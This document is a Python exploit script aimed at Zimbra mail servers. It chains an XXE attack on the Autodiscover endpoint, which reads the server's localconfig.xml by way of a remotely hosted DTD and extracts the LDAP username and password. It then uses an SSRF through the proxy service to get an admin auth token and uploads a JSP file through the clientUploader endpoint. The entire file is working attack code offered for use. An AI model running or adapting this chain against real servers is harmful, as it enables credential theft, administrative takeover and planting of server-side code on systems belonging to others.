#coding=utf8
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
base_url=sys.argv[1]

base_url=base_url.rstrip("/")

#upload file name and content
filename = "justatest.jsp"
fileContent = r'<%out.println("justatest");%>'
print(base_url)

#dtd file url
dtd_url="https://raw.githubusercontent.com/vulscanteam/include_lib_file/master/zimbra_XXE.txt"
"""
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
"""


xxe_data = r"""<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM "{dtd}">
        %dtd;
        %all;
        ]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
</Autodiscover>""".format(dtd=dtd_url)

#XXE stage
headers = {
    "Content-Type":"application/xml"
}
print("[*] Get User Name/Password By XXE ")
r = requests.post(base_url+"/Autodiscover/Autodiscover.xml",data=xxe_data,headers=headers,verify=False,timeout=15)
#print r.text
if 'response schema not available' not in r.text:
    print("have no xxe")
    exit()


#low_token Stage
import re
pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
pattern_password = re.compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
username = pattern_name.findall(r.text)[0][2]
password = pattern_password.findall(r.text)[0][2]
print(username)
print(password)

auth_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
   <soap:Header>
       <context xmlns="urn:zimbra">
           <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
       </context>
   </soap:Header>
   <soap:Body>
     <AuthRequest xmlns="{xmlns}">
        <account by="adminName">{username}</account>
        <password>{password}</password>
     </AuthRequest>
   </soap:Body>
</soap:Envelope>
"""
print("[*] Get Low Privilege Auth Token")
r=requests.post(base_url+"/service/soap",data=auth_body.format(xmlns="urn:zimbraAccount",username=username,password=password),verify=False)

pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")

low_priv_token = pattern_auth_token.findall(r.text)[0]

#print(low_priv_token)


# SSRF+Get Admin_Token Stage

headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+low_priv_token+";"
headers["Host"]="foo:7071"
print("[*] Get Admin  Auth Token By SSRF")
r = requests.post(base_url+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=auth_body.format(xmlns="urn:zimbraAdmin",username=username,password=password),headers=headers,verify=False)

admin_token =pattern_auth_token.findall(r.text)[0]
#print("ADMIN_TOKEN:"+admin_token)

f = {
    'filename1':(None,"whocare",None),
    'clientFile':(filename,fileContent,"text/plain"),
    'requestId':(None,"12",None),
}

headers ={
    "Cookie":"ZM_ADMIN_AUTH_TOKEN="+admin_token+";"
}
print("[*] Uploading file")
r = requests.post(base_url+"/service/extension/clientUploader/upload",files=f,headers=headers,verify=False)
print(r.text)
print("Please vist "+base_url+"/downloads/"+filename)
print("[*] Request Result:")
s = requests.session()
r = s.get(base_url+"/downloads/"+filename,verify=False,headers=headers)
print(r.text)
print("May need cookie:")
print(headers['Cookie'])
